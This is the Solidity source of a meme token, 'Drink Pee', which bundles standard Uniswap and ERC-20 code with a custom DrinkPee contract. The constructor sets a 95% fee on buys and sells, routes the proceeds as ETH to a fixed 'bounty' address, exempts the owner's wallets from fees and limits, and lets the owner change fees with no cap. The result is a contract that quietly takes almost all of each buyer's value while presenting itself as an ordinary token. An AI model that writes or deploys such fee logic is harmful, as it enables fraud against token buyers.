1 // SPDX-License-Identifier: No License
2 
3 /*
4 
5 #####################################
6 DRINK PEE TOKEN
7 INNOVATIVE DRINK TO EARN OF THE FUTURE
8 
9 WEB: WWW.DRINKP.LOL
10 DISCORD: https://discord.gg/HexbbKERxY
11 #####################################
12 
13 */
14 
15 pragma solidity 0.8.19;
16 
17 interface IUniswapV2Router01 {
18     function factory() external pure returns (address);
19     function WETH() external pure returns (address);
20 
21     function addLiquidity(
22         address tokenA,
23         address tokenB,
24         uint amountADesired,
25         uint amountBDesired,
26         uint amountAMin,
27         uint amountBMin,
28         address to,
29         uint deadline
30     ) external returns (uint amountA, uint amountB, uint liquidity);
31     function addLiquidityETH(
32         address token,
33         uint amountTokenDesired,
34         uint amountTokenMin,
35         uint amountETHMin,
36         address to,
37         uint deadline
38     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
39     function removeLiquidity(
40         address tokenA,
41         address tokenB,
42         uint liquidity,
43         uint amountAMin,
44         uint amountBMin,
45         address to,
46         uint deadline
47     ) external returns (uint amountA, uint amountB);
48     function removeLiquidityETH(
49         address token,
50         uint liquidity,
51         uint amountTokenMin,
52         uint amountETHMin,
53         address to,
54         uint deadline
55     ) external returns (uint amountToken, uint amountETH);
56     function removeLiquidityWithPermit(
57         address tokenA,
58         address tokenB,
59         uint liquidity,
60         uint amountAMin,
61         uint amountBMin,
62         address to,
63         uint deadline,
64         bool approveMax, uint8 v, bytes32 r, bytes32 s
65     ) external returns (uint amountA, uint amountB);
66     function removeLiquidityETHWithPermit(
67         address token,
68         uint liquidity,
69         uint amountTokenMin,
70         uint amountETHMin,
71         address to,
72         uint deadline,
73         bool approveMax, uint8 v, bytes32 r, bytes32 s
74     ) external returns (uint amountToken, uint amountETH);
75     function swapExactTokensForTokens(
76         uint amountIn,
77         uint amountOutMin,
78         address[] calldata path,
79         address to,
80         uint deadline
81     ) external returns (uint[] memory amounts);
82     function swapTokensForExactTokens(
83         uint amountOut,
84         uint amountInMax,
85         address[] calldata path,
86         address to,
87         uint deadline
88     ) external returns (uint[] memory amounts);
89     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
90         external
91         payable
92         returns (uint[] memory amounts);
93     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
94         external
95         returns (uint[] memory amounts);
96     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
97         external
98         returns (uint[] memory amounts);
99     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
100         external
101         payable
102         returns (uint[] memory amounts);
103 
104     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
105     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
106     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
107     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
108     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
109 }
110 
111 interface IUniswapV2Router02 is IUniswapV2Router01 {
112     function removeLiquidityETHSupportingFeeOnTransferTokens(
113         address token,
114         uint liquidity,
115         uint amountTokenMin,
116         uint amountETHMin,
117         address to,
118         uint deadline
119     ) external returns (uint amountETH);
120     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
121         address token,
122         uint liquidity,
123         uint amountTokenMin,
124         uint amountETHMin,
125         address to,
126         uint deadline,
127         bool approveMax, uint8 v, bytes32 r, bytes32 s
128     ) external returns (uint amountETH);
129 
130     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
131         uint amountIn,
132         uint amountOutMin,
133         address[] calldata path,
134         address to,
135         uint deadline
136     ) external;
137     function swapExactETHForTokensSupportingFeeOnTransferTokens(
138         uint amountOutMin,
139         address[] calldata path,
140         address to,
141         uint deadline
142     ) external payable;
143     function swapExactTokensForETHSupportingFeeOnTransferTokens(
144         uint amountIn,
145         uint amountOutMin,
146         address[] calldata path,
147         address to,
148         uint deadline
149     ) external;
150 }
151 
152 interface IUniswapV2Pair {
153     event Approval(address indexed owner, address indexed spender, uint value);
154     event Transfer(address indexed from, address indexed to, uint value);
155 
156     function name() external pure returns (string memory);
157     function symbol() external pure returns (string memory);
158     function decimals() external pure returns (uint8);
159     function totalSupply() external view returns (uint);
160     function balanceOf(address owner) external view returns (uint);
161     function allowance(address owner, address spender) external view returns (uint);
162 
163     function approve(address spender, uint value) external returns (bool);
164     function transfer(address to, uint value) external returns (bool);
165     function transferFrom(address from, address to, uint value) external returns (bool);
166 
167     function DOMAIN_SEPARATOR() external view returns (bytes32);
168     function PERMIT_TYPEHASH() external pure returns (bytes32);
169     function nonces(address owner) external view returns (uint);
170 
171     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
172 
173     event Mint(address indexed sender, uint amount0, uint amount1);
174     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
175     event Swap(
176         address indexed sender,
177         uint amount0In,
178         uint amount1In,
179         uint amount0Out,
180         uint amount1Out,
181         address indexed to
182     );
183     event Sync(uint112 reserve0, uint112 reserve1);
184 
185     function MINIMUM_LIQUIDITY() external pure returns (uint);
186     function factory() external view returns (address);
187     function token0() external view returns (address);
188     function token1() external view returns (address);
189     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
190     function price0CumulativeLast() external view returns (uint);
191     function price1CumulativeLast() external view returns (uint);
192     function kLast() external view returns (uint);
193 
194     function mint(address to) external returns (uint liquidity);
195     function burn(address to) external returns (uint amount0, uint amount1);
196     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
197     function skim(address to) external;
198     function sync() external;
199 
200     function initialize(address, address) external;
201 }
202 
203 interface IUniswapV2Factory {
204     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
205 
206     function feeTo() external view returns (address);
207     function feeToSetter() external view returns (address);
208 
209     function getPair(address tokenA, address tokenB) external view returns (address pair);
210     function allPairs(uint) external view returns (address pair);
211     function allPairsLength() external view returns (uint);
212 
213     function createPair(address tokenA, address tokenB) external returns (address pair);
214 
215     function setFeeTo(address) external;
216     function setFeeToSetter(address) external;
217 }
218 
219 /**
220  * @dev Provides information about the current execution context, including the
221  * sender of the transaction and its data. While these are generally available
222  * via msg.sender and msg.data, they should not be accessed in such a direct
223  * manner, since when dealing with meta-transactions the account sending and
224  * paying for execution may not be the actual sender (as far as an application
225  * is concerned).
226  *
227  * This contract is only required for intermediate, library-like contracts.
228  */
229 abstract contract Context {
230     function _msgSender() internal view virtual returns (address) {
231         return msg.sender;
232     }
233 
234     function _msgData() internal view virtual returns (bytes calldata) {
235         return msg.data;
236     }
237 }
238 
239 /**
240  * @dev Contract module which provides a basic access control mechanism, where
241  * there is an account (an owner) that can be granted exclusive access to
242  * specific functions.
243  *
244  * By default, the owner account will be the one that deploys the contract. This
245  * can later be changed with {transferOwnership}.
246  *
247  * This module is used through inheritance. It will make available the modifier
248  * `onlyOwner`, which can be applied to your functions to restrict their use to
249  * the owner.
250  */
251 abstract contract Ownable is Context {
252     address private _owner;
253 
254     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
255 
256     /**
257      * @dev Initializes the contract setting the deployer as the initial owner.
258      */
259     constructor() {
260         _transferOwnership(_msgSender());
261     }
262 
263     /**
264      * @dev Throws if called by any account other than the owner.
265      */
266     modifier onlyOwner() {
267         _checkOwner();
268         _;
269     }
270 
271     /**
272      * @dev Returns the address of the current owner.
273      */
274     function owner() public view virtual returns (address) {
275         return _owner;
276     }
277 
278     /**
279      * @dev Throws if the sender is not the owner.
280      */
281     function _checkOwner() internal view virtual {
282         require(owner() == _msgSender(), "Ownable: caller is not the owner");
283     }
284 
285     /**
286      * @dev Leaves the contract without owner. It will not be possible to call
287      * `onlyOwner` functions. Can only be called by the current owner.
288      *
289      * NOTE: Renouncing ownership will leave the contract without an owner,
290      * thereby disabling any functionality that is only available to the owner.
291      */
292     function renounceOwnership() public virtual onlyOwner {
293         _transferOwnership(address(0));
294     }
295 
296     /**
297      * @dev Transfers ownership of the contract to a new account (`newOwner`).
298      * Can only be called by the current owner.
299      */
300     function transferOwnership(address newOwner) public virtual onlyOwner {
301         require(newOwner != address(0), "Ownable: new owner is the zero address");
302         _transferOwnership(newOwner);
303     }
304 
305     /**
306      * @dev Transfers ownership of the contract to a new account (`newOwner`).
307      * Internal function without access restriction.
308      */
309     function _transferOwnership(address newOwner) internal virtual {
310         address oldOwner = _owner;
311         _owner = newOwner;
312         emit OwnershipTransferred(oldOwner, newOwner);
313     }
314 }
315 
316 /**
317  * @dev Interface of the ERC20 standard as defined in the EIP.
318  */
319 interface IERC20 {
320     /**
321      * @dev Emitted when `value` tokens are moved from one account (`from`) to
322      * another (`to`).
323      *
324      * Note that `value` may be zero.
325      */
326     event Transfer(address indexed from, address indexed to, uint256 value);
327 
328     /**
329      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
330      * a call to {approve}. `value` is the new allowance.
331      */
332     event Approval(address indexed owner, address indexed spender, uint256 value);
333 
334     /**
335      * @dev Returns the amount of tokens in existence.
336      */
337     function totalSupply() external view returns (uint256);
338 
339     /**
340      * @dev Returns the amount of tokens owned by `account`.
341      */
342     function balanceOf(address account) external view returns (uint256);
343 
344     /**
345      * @dev Moves `amount` tokens from the caller's account to `to`.
346      *
347      * Returns a boolean value indicating whether the operation succeeded.
348      *
349      * Emits a {Transfer} event.
350      */
351     function transfer(address to, uint256 amount) external returns (bool);
352 
353     /**
354      * @dev Returns the remaining number of tokens that `spender` will be
355      * allowed to spend on behalf of `owner` through {transferFrom}. This is
356      * zero by default.
357      *
358      * This value changes when {approve} or {transferFrom} are called.
359      */
360     function allowance(address owner, address spender) external view returns (uint256);
361 
362     /**
363      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
364      *
365      * Returns a boolean value indicating whether the operation succeeded.
366      *
367      * IMPORTANT: Beware that changing an allowance with this method brings the risk
368      * that someone may use both the old and the new allowance by unfortunate
369      * transaction ordering. One possible solution to mitigate this race
370      * condition is to first reduce the spender's allowance to 0 and set the
371      * desired value afterwards:
372      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
373      *
374      * Emits an {Approval} event.
375      */
376     function approve(address spender, uint256 amount) external returns (bool);
377 
378     /**
379      * @dev Moves `amount` tokens from `from` to `to` using the
380      * allowance mechanism. `amount` is then deducted from the caller's
381      * allowance.
382      *
383      * Returns a boolean value indicating whether the operation succeeded.
384      *
385      * Emits a {Transfer} event.
386      */
387     function transferFrom(address from, address to, uint256 amount) external returns (bool);
388 }
389 
390 /**
391  * @dev Interface for the optional metadata functions from the ERC20 standard.
392  *
393  * _Available since v4.1._
394  */
395 interface IERC20Metadata is IERC20 {
396     /**
397      * @dev Returns the name of the token.
398      */
399     function name() external view returns (string memory);
400 
401     /**
402      * @dev Returns the symbol of the token.
403      */
404     function symbol() external view returns (string memory);
405 
406     /**
407      * @dev Returns the decimals places of the token.
408      */
409     function decimals() external view returns (uint8);
410 }
411 
412 /**
413  * @dev Implementation of the {IERC20} interface.
414  *
415  * This implementation is agnostic to the way tokens are created. This means
416  * that a supply mechanism has to be added in a derived contract using {_mint}.
417  * For a generic mechanism see {ERC20PresetMinterPauser}.
418  *
419  * TIP: For a detailed writeup see our guide
420  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
421  * to implement supply mechanisms].
422  *
423  * The default value of {decimals} is 18. To change this, you should override
424  * this function so it returns a different value.
425  *
426  * We have followed general OpenZeppelin Contracts guidelines: functions revert
427  * instead returning `false` on failure. This behavior is nonetheless
428  * conventional and does not conflict with the expectations of ERC20
429  * applications.
430  *
431  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
432  * This allows applications to reconstruct the allowance for all accounts just
433  * by listening to said events. Other implementations of the EIP may not emit
434  * these events, as it isn't required by the specification.
435  *
436  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
437  * functions have been added to mitigate the well-known issues around setting
438  * allowances. See {IERC20-approve}.
439  */
440 contract ERC20 is Context, IERC20, IERC20Metadata {
441     mapping(address => uint256) private _balances;
442 
443     mapping(address => mapping(address => uint256)) private _allowances;
444 
445     uint256 private _totalSupply;
446 
447     string private _name;
448     string private _symbol;
449 
450     /**
451      * @dev Sets the values for {name} and {symbol}.
452      *
453      * All two of these values are immutable: they can only be set once during
454      * construction.
455      */
456     constructor(string memory name_, string memory symbol_) {
457         _name = name_;
458         _symbol = symbol_;
459     }
460 
461     /**
462      * @dev Returns the name of the token.
463      */
464     function name() public view virtual override returns (string memory) {
465         return _name;
466     }
467 
468     /**
469      * @dev Returns the symbol of the token, usually a shorter version of the
470      * name.
471      */
472     function symbol() public view virtual override returns (string memory) {
473         return _symbol;
474     }
475 
476     /**
477      * @dev Returns the number of decimals used to get its user representation.
478      * For example, if `decimals` equals `2`, a balance of `505` tokens should
479      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
480      *
481      * Tokens usually opt for a value of 18, imitating the relationship between
482      * Ether and Wei. This is the default value returned by this function, unless
483      * it's overridden.
484      *
485      * NOTE: This information is only used for _display_ purposes: it in
486      * no way affects any of the arithmetic of the contract, including
487      * {IERC20-balanceOf} and {IERC20-transfer}.
488      */
489     function decimals() public view virtual override returns (uint8) {
490         return 18;
491     }
492 
493     /**
494      * @dev See {IERC20-totalSupply}.
495      */
496     function totalSupply() public view virtual override returns (uint256) {
497         return _totalSupply;
498     }
499 
500     /**
501      * @dev See {IERC20-balanceOf}.
502      */
503     function balanceOf(address account) public view virtual override returns (uint256) {
504         return _balances[account];
505     }
506 
507     /**
508      * @dev See {IERC20-transfer}.
509      *
510      * Requirements:
511      *
512      * - `to` cannot be the zero address.
513      * - the caller must have a balance of at least `amount`.
514      */
515     function transfer(address to, uint256 amount) public virtual override returns (bool) {
516         address owner = _msgSender();
517         _transfer(owner, to, amount);
518         return true;
519     }
520 
521     /**
522      * @dev See {IERC20-allowance}.
523      */
524     function allowance(address owner, address spender) public view virtual override returns (uint256) {
525         return _allowances[owner][spender];
526     }
527 
528     /**
529      * @dev See {IERC20-approve}.
530      *
531      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
532      * `transferFrom`. This is semantically equivalent to an infinite approval.
533      *
534      * Requirements:
535      *
536      * - `spender` cannot be the zero address.
537      */
538     function approve(address spender, uint256 amount) public virtual override returns (bool) {
539         address owner = _msgSender();
540         _approve(owner, spender, amount);
541         return true;
542     }
543 
544     /**
545      * @dev See {IERC20-transferFrom}.
546      *
547      * Emits an {Approval} event indicating the updated allowance. This is not
548      * required by the EIP. See the note at the beginning of {ERC20}.
549      *
550      * NOTE: Does not update the allowance if the current allowance
551      * is the maximum `uint256`.
552      *
553      * Requirements:
554      *
555      * - `from` and `to` cannot be the zero address.
556      * - `from` must have a balance of at least `amount`.
557      * - the caller must have allowance for ``from``'s tokens of at least
558      * `amount`.
559      */
560     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
561         address spender = _msgSender();
562         _spendAllowance(from, spender, amount);
563         _transfer(from, to, amount);
564         return true;
565     }
566 
567     /**
568      * @dev Atomically increases the allowance granted to `spender` by the caller.
569      *
570      * This is an alternative to {approve} that can be used as a mitigation for
571      * problems described in {IERC20-approve}.
572      *
573      * Emits an {Approval} event indicating the updated allowance.
574      *
575      * Requirements:
576      *
577      * - `spender` cannot be the zero address.
578      */
579     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
580         address owner = _msgSender();
581         _approve(owner, spender, allowance(owner, spender) + addedValue);
582         return true;
583     }
584 
585     /**
586      * @dev Atomically decreases the allowance granted to `spender` by the caller.
587      *
588      * This is an alternative to {approve} that can be used as a mitigation for
589      * problems described in {IERC20-approve}.
590      *
591      * Emits an {Approval} event indicating the updated allowance.
592      *
593      * Requirements:
594      *
595      * - `spender` cannot be the zero address.
596      * - `spender` must have allowance for the caller of at least
597      * `subtractedValue`.
598      */
599     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
600         address owner = _msgSender();
601         uint256 currentAllowance = allowance(owner, spender);
602         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
603         unchecked {
604             _approve(owner, spender, currentAllowance - subtractedValue);
605         }
606 
607         return true;
608     }
609 
610     /**
611      * @dev Moves `amount` of tokens from `from` to `to`.
612      *
613      * This internal function is equivalent to {transfer}, and can be used to
614      * e.g. implement automatic token fees, slashing mechanisms, etc.
615      *
616      * Emits a {Transfer} event.
617      *
618      * Requirements:
619      *
620      * - `from` cannot be the zero address.
621      * - `to` cannot be the zero address.
622      * - `from` must have a balance of at least `amount`.
623      */
624     function _transfer(address from, address to, uint256 amount) internal virtual {
625         require(from != address(0), "ERC20: transfer from the zero address");
626         require(to != address(0), "ERC20: transfer to the zero address");
627 
628         _beforeTokenTransfer(from, to, amount);
629 
630         uint256 fromBalance = _balances[from];
631         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
632         unchecked {
633             _balances[from] = fromBalance - amount;
634             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
635             // decrementing then incrementing.
636             _balances[to] += amount;
637         }
638 
639         emit Transfer(from, to, amount);
640 
641         _afterTokenTransfer(from, to, amount);
642     }
643 
644     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
645      * the total supply.
646      *
647      * Emits a {Transfer} event with `from` set to the zero address.
648      *
649      * Requirements:
650      *
651      * - `account` cannot be the zero address.
652      */
653     function _mint(address account, uint256 amount) internal virtual {
654         require(account != address(0), "ERC20: mint to the zero address");
655 
656         _beforeTokenTransfer(address(0), account, amount);
657 
658         _totalSupply += amount;
659         unchecked {
660             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
661             _balances[account] += amount;
662         }
663         emit Transfer(address(0), account, amount);
664 
665         _afterTokenTransfer(address(0), account, amount);
666     }
667 
668     /**
669      * @dev Destroys `amount` tokens from `account`, reducing the
670      * total supply.
671      *
672      * Emits a {Transfer} event with `to` set to the zero address.
673      *
674      * Requirements:
675      *
676      * - `account` cannot be the zero address.
677      * - `account` must have at least `amount` tokens.
678      */
679     function _burn(address account, uint256 amount) internal virtual {
680         require(account != address(0), "ERC20: burn from the zero address");
681 
682         _beforeTokenTransfer(account, address(0), amount);
683 
684         uint256 accountBalance = _balances[account];
685         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
686         unchecked {
687             _balances[account] = accountBalance - amount;
688             // Overflow not possible: amount <= accountBalance <= totalSupply.
689             _totalSupply -= amount;
690         }
691 
692         emit Transfer(account, address(0), amount);
693 
694         _afterTokenTransfer(account, address(0), amount);
695     }
696 
697     /**
698      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
699      *
700      * This internal function is equivalent to `approve`, and can be used to
701      * e.g. set automatic allowances for certain subsystems, etc.
702      *
703      * Emits an {Approval} event.
704      *
705      * Requirements:
706      *
707      * - `owner` cannot be the zero address.
708      * - `spender` cannot be the zero address.
709      */
710     function _approve(address owner, address spender, uint256 amount) internal virtual {
711         require(owner != address(0), "ERC20: approve from the zero address");
712         require(spender != address(0), "ERC20: approve to the zero address");
713 
714         _allowances[owner][spender] = amount;
715         emit Approval(owner, spender, amount);
716     }
717 
718     /**
719      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
720      *
721      * Does not update the allowance amount in case of infinite allowance.
722      * Revert if not enough allowance is available.
723      *
724      * Might emit an {Approval} event.
725      */
726     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
727         uint256 currentAllowance = allowance(owner, spender);
728         if (currentAllowance != type(uint256).max) {
729             require(currentAllowance >= amount, "ERC20: insufficient allowance");
730             unchecked {
731                 _approve(owner, spender, currentAllowance - amount);
732             }
733         }
734     }
735 
736     /**
737      * @dev Hook that is called before any transfer of tokens. This includes
738      * minting and burning.
739      *
740      * Calling conditions:
741      *
742      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
743      * will be transferred to `to`.
744      * - when `from` is zero, `amount` tokens will be minted for `to`.
745      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
746      * - `from` and `to` are never both zero.
747      *
748      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
749      */
750     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
751 
752     /**
753      * @dev Hook that is called after any transfer of tokens. This includes
754      * minting and burning.
755      *
756      * Calling conditions:
757      *
758      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
759      * has been transferred to `to`.
760      * - when `from` is zero, `amount` tokens have been minted for `to`.
761      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
762      * - `from` and `to` are never both zero.
763      *
764      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
765      */
766     function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
767 }
768 
769 /**
770  * @dev Extension of {ERC20} that allows token holders to destroy both their own
771  * tokens and those that they have an allowance for, in a way that can be
772  * recognized off-chain (via event analysis).
773  */
774 abstract contract ERC20Burnable is Context, ERC20 {
775     /**
776      * @dev Destroys `amount` tokens from the caller.
777      *
778      * See {ERC20-_burn}.
779      */
780     function burn(uint256 amount) public virtual {
781         _burn(_msgSender(), amount);
782     }
783 
784     /**
785      * @dev Destroys `amount` tokens from `account`, deducting from the caller's
786      * allowance.
787      *
788      * See {ERC20-_burn} and {ERC20-allowance}.
789      *
790      * Requirements:
791      *
792      * - the caller must have allowance for ``accounts``'s tokens of at least
793      * `amount`.
794      */
795     function burnFrom(address account, uint256 amount) public virtual {
796         _spendAllowance(account, _msgSender(), amount);
797         _burn(account, amount);
798     }
799 }
800 
801 contract DrinkPee is ERC20, ERC20Burnable, Ownable {
802     
803     uint256 public swapThreshold;
804     
805     uint256 private _bountyPending;
806 
807     address public bountyAddress;
808     uint16[3] public bountyFees;
809 
810     mapping (address => bool) public isExcludedFromFees;
811 
812     uint16[3] public totalFees;
813     bool private _swapping;
814 
815     IUniswapV2Router02 public routerV2;
816     address public pairV2;
817     mapping (address => bool) public AMMPairs;
818 
819     mapping (address => bool) public isExcludedFromLimits;
820 
821     uint256 public maxWalletAmount;
822 
823     uint256 public maxBuyAmount;
824     uint256 public maxSellAmount;
825  
826     event SwapThresholdUpdated(uint256 swapThreshold);
827 
828     event bountyAddressUpdated(address bountyAddress);
829     event bountyFeesUpdated(uint16 buyFee, uint16 sellFee, uint16 transferFee);
830     event bountyFeeSent(address recipient, uint256 amount);
831 
832     event ExcludeFromFees(address indexed account, bool isExcluded);
833 
834     event RouterV2Updated(address indexed routerV2);
835     event AMMPairsUpdated(address indexed AMMPair, bool isPair);
836 
837     event ExcludeFromLimits(address indexed account, bool isExcluded);
838 
839     event MaxWalletAmountUpdated(uint256 maxWalletAmount);
840 
841     event MaxBuyAmountUpdated(uint256 maxBuyAmount);
842     event MaxSellAmountUpdated(uint256 maxSellAmount);
843  
844     constructor()
845         ERC20(unicode"Drink Pee", unicode"DRINKP") 
846     {
847         address supplyRecipient = 0x78e124422F76A26763c0cB675Ac9cECB2bF976C1;
848         
849         updateSwapThreshold(500000 * (10 ** decimals()) / 10);
850 
851         bountyAddressSetup(0xEb2E71503312dB5fDB82C5d4F2405B287c1C2f96);
852         bountyFeesSetup(9500, 9500, 0);
853 
854         excludeFromFees(supplyRecipient, true);
855         excludeFromFees(address(this), true); 
856 
857         _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
858 
859         excludeFromLimits(supplyRecipient, true);
860         excludeFromLimits(address(this), true);
861         excludeFromLimits(address(0), true); 
862         excludeFromLimits(bountyAddress, true);
863 
864         updateMaxWalletAmount(20000000 * (10 ** decimals()) / 10);
865 
866         updateMaxBuyAmount(20000000 * (10 ** decimals()) / 10);
867         updateMaxSellAmount(20000000 * (10 ** decimals()) / 10);
868 
869         _mint(supplyRecipient, 1000000000 * (10 ** decimals()) / 10);
870         _transferOwnership(0x78e124422F76A26763c0cB675Ac9cECB2bF976C1);
871     }
872 
873     receive() external payable {}
874 
875     function decimals() public pure override returns (uint8) {
876         return 18;
877     }
878     
879     function _swapTokensForCoin(uint256 tokenAmount) private {
880         address[] memory path = new address[](2);
881         path[0] = address(this);
882         path[1] = routerV2.WETH();
883 
884         _approve(address(this), address(routerV2), tokenAmount);
885 
886         routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
887     }
888 
889     function updateSwapThreshold(uint256 _swapThreshold) public onlyOwner {
890         swapThreshold = _swapThreshold;
891         
892         emit SwapThresholdUpdated(_swapThreshold);
893     }
894 
895     function getAllPending() public view returns (uint256) {
896         return 0 + _bountyPending;
897     }
898 
899     function bountyAddressSetup(address _newAddress) public onlyOwner {
900         bountyAddress = _newAddress;
901 
902         excludeFromFees(_newAddress, true);
903 
904         emit bountyAddressUpdated(_newAddress);
905     }
906 
907     function bountyFeesSetup(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
908         bountyFees = [_buyFee, _sellFee, _transferFee];
909 
910         totalFees[0] = 0 + bountyFees[0];
911         totalFees[1] = 0 + bountyFees[1];
912         totalFees[2] = 0 + bountyFees[2];
913 
914         emit bountyFeesUpdated(_buyFee, _sellFee, _transferFee);
915     }
916 
917     function excludeFromFees(address account, bool isExcluded) public onlyOwner {
918         isExcludedFromFees[account] = isExcluded;
919         
920         emit ExcludeFromFees(account, isExcluded);
921     }
922 
923     function _transfer(
924         address from,
925         address to,
926         uint256 amount
927     ) internal override {
928         
929         bool canSwap = getAllPending() >= swapThreshold;
930         
931         if (!_swapping && !AMMPairs[from] && canSwap) {
932             _swapping = true;
933             
934             if (false || _bountyPending > 0) {
935                 uint256 token2Swap = 0 + _bountyPending;
936                 bool success = false;
937 
938                 _swapTokensForCoin(token2Swap);
939                 uint256 coinsReceived = address(this).balance;
940                 
941                 uint256 bountyPortion = coinsReceived * _bountyPending / token2Swap;
942                 if (bountyPortion > 0) {
943                     (success,) = payable(address(bountyAddress)).call{value: bountyPortion}("");
944                     require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
945                     emit bountyFeeSent(bountyAddress, bountyPortion);
946                 }
947                 _bountyPending = 0;
948 
949             }
950 
951             _swapping = false;
952         }
953 
954         if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
955             uint256 fees = 0;
956             uint8 txType = 3;
957             
958             if (AMMPairs[from]) {
959                 if (totalFees[0] > 0) txType = 0;
960             }
961             else if (AMMPairs[to]) {
962                 if (totalFees[1] > 0) txType = 1;
963             }
964             else if (totalFees[2] > 0) txType = 2;
965             
966             if (txType < 3) {
967                 
968                 fees = amount * totalFees[txType] / 10000;
969                 amount -= fees;
970                 
971                 _bountyPending += fees * bountyFees[txType] / totalFees[txType];
972 
973                 
974             }
975 
976             if (fees > 0) {
977                 super._transfer(from, address(this), fees);
978             }
979         }
980         
981         super._transfer(from, to, amount);
982         
983     }
984 
985     function _updateRouterV2(address router) private {
986         routerV2 = IUniswapV2Router02(router);
987         pairV2 = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
988         
989         excludeFromLimits(router, true);
990 
991         _setAMMPair(pairV2, true);
992 
993         emit RouterV2Updated(router);
994     }
995 
996     function setAMMPair(address pair, bool isPair) public onlyOwner {
997         require(pair != pairV2, "DefaultRouter: Cannot remove initial pair from list");
998 
999         _setAMMPair(pair, isPair);
1000     }
1001 
1002     function _setAMMPair(address pair, bool isPair) private {
1003         AMMPairs[pair] = isPair;
1004 
1005         if (isPair) { 
1006             excludeFromLimits(pair, true);
1007 
1008         }
1009 
1010         emit AMMPairsUpdated(pair, isPair);
1011     }
1012 
1013     function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
1014         isExcludedFromLimits[account] = isExcluded;
1015 
1016         emit ExcludeFromLimits(account, isExcluded);
1017     }
1018 
1019     function updateMaxWalletAmount(uint256 _maxWalletAmount) public onlyOwner {
1020         maxWalletAmount = _maxWalletAmount;
1021         
1022         emit MaxWalletAmountUpdated(_maxWalletAmount);
1023     }
1024 
1025     function updateMaxBuyAmount(uint256 _maxBuyAmount) public onlyOwner {
1026         maxBuyAmount = _maxBuyAmount;
1027         
1028         emit MaxBuyAmountUpdated(_maxBuyAmount);
1029     }
1030 
1031     function updateMaxSellAmount(uint256 _maxSellAmount) public onlyOwner {
1032         maxSellAmount = _maxSellAmount;
1033         
1034         emit MaxSellAmountUpdated(_maxSellAmount);
1035     }
1036 
1037     function _beforeTokenTransfer(address from, address to, uint256 amount)
1038         internal
1039         override
1040     {
1041         if (AMMPairs[from] && !isExcludedFromLimits[to]) { // BUY
1042             require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
1043         }
1044     
1045         if (AMMPairs[to] && !isExcludedFromLimits[from]) { // SELL
1046             require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
1047         }
1048     
1049         super._beforeTokenTransfer(from, to, amount);
1050     }
1051 
1052     function _afterTokenTransfer(address from, address to, uint256 amount)
1053         internal
1054         override
1055     {
1056         if (!isExcludedFromLimits[to]) {
1057             require(balanceOf(to) <= maxWalletAmount, "MaxWallet: Cannot exceed max wallet limit");
1058         }
1059 
1060         super._afterTokenTransfer(from, to, amount);
1061     }
1062 }